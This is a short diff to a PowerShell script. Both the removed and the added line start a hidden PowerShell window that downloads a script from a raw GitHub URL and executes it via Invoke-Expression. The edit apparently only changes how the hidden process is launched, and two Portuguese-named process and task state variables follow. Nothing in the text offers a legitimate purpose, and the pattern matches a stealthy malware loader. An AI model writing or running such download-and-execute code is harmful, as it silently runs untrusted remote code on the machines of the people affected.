@@ -1,4 +1,4 @@
-powershell -windowstyle hidden -Command "Invoke-Expression (Invoke-REstMethod -Uri 'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt')"
+Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
 $ativoprocess = $false
 $ativotask = $null
 
